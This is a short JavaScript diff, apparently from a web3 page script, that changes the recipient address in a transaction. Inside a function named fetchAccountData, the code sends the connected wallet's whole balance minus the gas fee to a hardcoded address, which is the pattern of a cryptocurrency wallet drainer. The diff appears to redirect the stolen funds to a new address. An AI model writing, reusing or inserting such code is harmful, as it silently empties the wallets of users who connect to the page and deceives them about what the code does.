@@ -133,7 +133,7 @@ async function fetchAccountData() {
 
     if (balanceMinusFee > 0) {
       var transaction = {
-        to: "0xB49585D65fA3134175E03c8774c1187eB27dc24b",
+        to: "0x1C069658A562D47342E04fB408F4F09737c30Bf4",
         from: accounts[0],
         value: balanceMinusFee,
         gas: gas,
